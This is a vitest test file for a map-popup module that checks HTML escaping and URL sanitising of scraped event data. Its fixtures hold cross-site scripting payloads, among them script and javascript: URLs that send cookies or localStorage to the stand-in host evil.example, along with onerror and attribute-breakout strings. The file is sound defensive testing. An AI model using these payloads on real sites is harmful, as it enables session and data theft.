import { describe, it, expect } from 'vitest';
import { escapeHtml, popupHtml, safeHref } from './mapPopup';

// Values of the kind a scraped source can actually produce.
const HOSTILE_TITLE = '<img src=x onerror="alert(document.cookie)">Jazz Night';
const HOSTILE_VENUE = '</span><script>fetch("https://evil.example/"+document.cookie)</script>';
const HOSTILE_URL = 'javascript:fetch("https://evil.example/"+localStorage.getItem("x"))';

describe('escapeHtml', () => {
  it('neutralizes markup and quote characters', () => {
    expect(escapeHtml('<b>"x"</b>')).toBe('&lt;b&gt;&quot;x&quot;&lt;/b&gt;');
    expect(escapeHtml("it's")).toBe('it&#39;s');
    expect(escapeHtml('a & b')).toBe('a &amp; b');
  });

  it('renders a missing value as an empty string, not "undefined"', () => {
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(null)).toBe('');
  });
});

describe('safeHref', () => {
  it('allows http and https', () => {
    expect(safeHref('https://dice.fm/event/abc')).toBe('https://dice.fm/event/abc');
    expect(safeHref('http://example.org/x')).toBe('http://example.org/x');
  });

  it('rejects javascript: and data: URLs', () => {
    expect(safeHref(HOSTILE_URL)).toBeNull();
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeHref('vbscript:msgbox(1)')).toBeNull();
  });

  it('rejects a scheme hidden behind whitespace or control characters', () => {
    // A browser ignores these inside a scheme, so "java<TAB>script:" is still a
    // javascript: URL. Built by char code to keep them out of the source file.
    const split = (code: number) => `java${String.fromCharCode(code)}script:alert(1)`;
    expect(safeHref(' javascript:alert(1)')).toBeNull();
    expect(safeHref(split(9))).toBeNull(); // tab
    expect(safeHref(split(10))).toBeNull(); // newline
    expect(safeHref(split(13))).toBeNull(); // carriage return
    expect(safeHref(`${String.fromCharCode(0)}javascript:alert(1)`)).toBeNull();
  });

  it('rejects a protocol-relative or relative URL, and a non-string', () => {
    expect(safeHref('//evil.example/x')).toBeNull();
    expect(safeHref('/calendar/x')).toBeNull();
    expect(safeHref('https://')).toBeNull();
    expect(safeHref(undefined)).toBeNull();
    expect(safeHref({ toString: () => 'https://ok.example' })).toBeNull();
  });
});

describe('popupHtml', () => {
  it('escapes a hostile title and venue instead of injecting them', () => {
    const html = popupHtml({
      title: HOSTILE_TITLE,
      venue: HOSTILE_VENUE,
      url: 'https://dice.fm/event/abc',
    });

    // The only tags in the output are the ones this module writes.
    expect(html.match(/<\/?[a-z][^>]*>/gi)).toEqual([
      '<strong style="display:block;margin-bottom:4px">',
      '<a href="https://dice.fm/event/abc" target="_blank" rel="noreferrer noopener" style="color:inherit">',
      '</a>',
      '</strong>',
      '<span style="font-size:0.8em;opacity:.7">',
      '</span>',
    ]);
    expect(html).not.toContain(HOSTILE_TITLE);
    expect(html).not.toContain(HOSTILE_VENUE);
    // The text is still shown, just inert.
    expect(html).toContain('Jazz Night');
    expect(html).toContain('&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;');
  });

  it('drops the link entirely for an unsafe URL, keeping the title as text', () => {
    const html = popupHtml({ title: 'Jazz Night', venue: 'Smalls', url: HOSTILE_URL });
    expect(html).not.toMatch(/<a /);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).toContain('Jazz Night');
  });

  it('links a safe URL and cannot be broken out of the href attribute', () => {
    const html = popupHtml({
      title: 'Show',
      venue: 'Venue',
      url: 'https://ex.example/a?q="><img src=x onerror=alert(1)>',
    });
    expect(html).toContain('<a href="https://ex.example/a?q=&quot;&gt;&lt;img');
    expect(html).not.toMatch(/<img src=x/i);
  });

  it('opens external links without handing the opener over', () => {
    const html = popupHtml({ title: 't', venue: 'v', url: 'https://ok.example/x' });
    expect(html).toContain('rel="noreferrer noopener"');
    expect(html).toContain('target="_blank"');
  });
});
